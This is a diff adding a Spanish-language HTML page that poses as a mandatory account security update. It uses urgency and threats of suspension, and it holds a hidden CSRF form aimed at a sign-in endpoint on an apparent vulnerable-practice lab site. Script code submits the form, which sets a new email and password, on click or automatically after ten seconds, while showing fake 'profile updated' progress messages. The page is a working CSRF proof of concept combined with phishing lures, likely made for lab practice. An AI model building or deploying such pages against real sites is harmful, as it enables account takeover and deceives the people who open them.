@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>¡Actualiza tu perfil!</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: rgba(255,255,255,0.1);
+            padding: 30px;
+            border-radius: 10px;
+            backdrop-filter: blur(10px);
+        }
+        .button {
+            background: #4CAF50;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px 0;
+            display: block;
+            width: 100%;
+        }
+        .button:hover {
+            background: #45a049;
+        }
+        .warning {
+            background: rgba(255,255,0,0.2);
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+            border-left: 4px solid #ffeb3b;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔒 Actualización de Seguridad Requerida</h1>
+        
+        <div class="warning">
+            <strong>⚠️ Importante:</strong> Por motivos de seguridad, necesitamos que actualices tu información de perfil. 
+            Esta es una medida preventiva para proteger tu cuenta.
+        </div>
+        
+        <p>Hemos detectado actividad sospechosa en tu cuenta. Para mantener la seguridad, por favor actualiza tu información haciendo clic en el botón de abajo.</p>
+        
+        <p>Esta actualización es <strong>obligatoria</strong> y debe completarse en los próximos 5 minutos para evitar la suspensión de tu cuenta.</p>
+        
+        <!-- Formulario CSRF oculto -->
+        <form id="hiddenForm" action="http://hackme1.vulnmachines.com/csrf/signin.php" method="POST" style="display: none;">
+            <input type="hidden" name="fname" value="Updated">
+            <input type="hidden" name="lname" value="Profile">
+            <input type="hidden" name="email" value="updated@profile.com">
+            <input type="hidden" name="password" value="newsecurepass123">
+            <input type="hidden" name="gender" value="male">
+            <input type="hidden" name="cno" value="9876543210">
+            <input type="hidden" name="age" value="28">
+            <input type="hidden" name="submit" value="Submit">
+        </form>
+        
+        <button class="button" onclick="executeUpdate()">
+            🔄 Actualizar Perfil Ahora
+        </button>
+        
+        <p><small>Al hacer clic en "Actualizar Perfil Ahora", confirmas que has leído y aceptas nuestros términos de servicio.</small></p>
+        
+        <div id="status" style="margin-top: 20px; padding: 10px; background: rgba(0,0,0,0.3); border-radius: 5px; display: none;">
+            <p id="statusText">Procesando actualización...</p>
+        </div>
+    </div>
+    
+    <script>
+        function executeUpdate() {
+            const statusDiv = document.getElementById('status');
+            const statusText = document.getElementById('statusText');
+            
+            statusDiv.style.display = 'block';
+            statusText.textContent = 'Enviando actualización de perfil...';
+            
+            // Simular proceso de actualización
+            setTimeout(() => {
+                statusText.textContent = 'Verificando información...';
+            }, 1000);
+            
+            setTimeout(() => {
+                statusText.textContent = 'Actualizando base de datos...';
+            }, 2000);
+            
+            setTimeout(() => {
+                // Ejecutar el ataque CSRF
+                document.getElementById('hiddenForm').submit();
+                statusText.textContent = '✅ Perfil actualizado exitosamente!';
+                statusDiv.style.background = 'rgba(76, 175, 80, 0.3)';
+            }, 3000);
+        }
+        
+        // Auto-ejecutar después de 10 segundos si el usuario no hace clic
+        setTimeout(() => {
+            if (document.getElementById('status').style.display === 'none') {
+                executeUpdate();
+            }
+        }, 10000);
+    </script>
+</body>
+</html>
